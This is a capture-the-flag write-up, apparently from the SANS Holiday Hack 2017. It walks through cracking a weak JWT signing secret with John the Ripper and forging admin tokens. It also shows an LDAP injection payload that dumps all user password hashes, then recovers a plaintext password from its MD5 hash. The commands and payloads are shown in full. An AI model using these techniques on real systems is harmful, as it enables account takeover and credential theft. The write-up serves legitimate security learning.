JSON Web Tokens have been getting more and more popular it seems, and I've encountered them fairly often on my last few pentests. Decoding the base64 encoded data showed me this was a JWT and the problem was that the expiration date was back in August!

```json
{"alg":"HS256","typ":"JWT"}.{"dept":"Engineering","ou":"elf","expires":"2017-08-16 12:00:47.248093+00:00","uid":"alabaster.snowball"}.3¶x#p­­kxHl¹¢6V9_â¶¡VB=N$r6I
```

*(The unprintable characters are the raw bytes of the signature)*

JWTs are verified serverside by calculating an HMAC of the data section with a secret key and comparing it to the signature bytes. Asymmetric JWTs are a thing too, but the "alg" showed me this was just using HS256.

What I needed to do was try to crack the secret value through bruteforce. I could keep guessing at secret keys and comparing the HMAC with the signature value until I found a match. Now generally this should be a futile effort since JWTs *should* be using really strong, random keys that would be impossible to bruteforce - but since Alabaster didn't have the best track record of configuring things securely I had a good feeling it was possible...

After some quick Googling for techniques for cracking JWTs I found a really useful [python script](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) for converting a JWT to a format that [John](http://www.openwall.com/john/) could crack. I downloaded the script and converted the JWT to a format for consumption with John:

```
python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > johnw_jwt.txt
```

Then I fed that output file to John on my local machine with the "rockyou.txt" wordlist:

```
john.exe C:\projects\holidayhack17\edb\johnw_jwt.txt C:\tools\SecLists\Passwords\rockyou.txt
```

After a few minutes, it cracked the JWT!

![JWT cracked](/images/2018/01/edb_jwt_cracked-1.png)

I now had the secret key used to sign JWT values: "3lv3s"

With that value, I could craft any custom JWT value I wanted. I used Python with [pyjwt](https://github.com/jpadilla/pyjwt) to decode, modify and sign a new JWT that expired in a year:

![Craft new JWT](/images/2018/01/edb_craft_jwt.png)

I used `localStorage.setItem('np-auth', '<data>')` in Firefox to set the new JWT, refreshed the page and I was logged in to the Elf Database!

## Part 3 - LDAP Injection
The next part of the challenge required some LDAP injection. The hint pointed to a [great blogpost](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap) about web-based LDAP injection, so I started looking for areas within the application that accepted LDAP in parameters:

![EDB LDAP Search](/images/2018/01/edb_ldap_search.png)

Also, in the source code for one of the pages was a comment that detailed the exact LDAP lookup that's performed:

```
//Note: remember to remove comments about backend query before going into north pole production network
                /*

                isElf = 'elf'
                if request.form['isElf'] != 'True':
                    isElf = 'reindeer'
                attribute_list = [x.encode('UTF8') for x in request.form['attributes'].split(',')]
                result = ldap_query('(|(&(gn=*'+request.form['name']+'*)(ou='+isElf+'))(&(sn=*'+request.form['name']+'*)(ou='+isElf+')))', attribute_list)

                #request.form is the dictionary containing post params sent by client-side
                #We only want to allow query elf/reindeer data

                */
```

As well as "robots.txt" leading to an LDIF template of the LDAP structure: http://edb.northpolechristmastown.com/dev/LDIF_template.txt

I wante to use LDAP injection to dump *all* LDAP entries *including* the userPasswort attribute.

To start with I, created the exact LDAP query used when I just searched for "ala":

```
(|(&(gn=*ala*)(ou='elf'))(&(sn=*ala'*)(ou=elf)))
```

If I injected some special characters into the search field, I could escape out and modify the query. By searching for the name `)(ou=*))(|(cn=`, the query became:

```
(|(&(gn=*)(ou=*))(|(cn=*)(ou='elf'))(&(sn=*)(ou=*))(|(cn=*)(ou=elf)))
```
Which returns all results from any OU. Finally, by adding "userPassword" to the list of attributes in the POST request, I dumped the password hash for every user, including Santa!

![EDB LDAP Dump](/images/2018/01/edb_ldap_all.png)

LDAP uses MD5 for password hashing which is pretty easy to crack, but also a lot of cracked MD5s are available online. Searching for Santa's hash (d8b4c05a35b0513f302a85c409b4aab3) gave me the plaintext: 001cookielips001.

The last thing to do was to just forge a JWT for Santa Clause:

```
{"dept":"administrators","ou":"human","expires":"2018-08-16 12:00:47.248093+00:00","uid":"santa.claus"}
```
and log in to the Santa portal:

![EDB Santa Login](/images/2018/01/edb_santa_login.png)

## Answer to Question 8
> Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?

**The final letter was located at http://edb.northpolechristmastown.com/img/wizard_of_oz_to_santa_d0t011d408nx.png, and was from the Wizard of Oz**

# Final Question and Conclusion
> Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?

**After completing all the challenges, and beating the final level, I unlocked a conversation that finally disclosed the "villain": Glinda, the Good Witch.**

![Glinda Convo]()

**She wanted to start a war between the Elves and the Munchkins so she could profit!**

In conclusion, the SANS team hit another homerun with some awesome challenges that mimicked real-world pentest activities and kept me entertained for several days throughout the holidays. Cheers!

# tl;dr
I don't blame you ;) just look at the screenshots I guess?

-ropnop

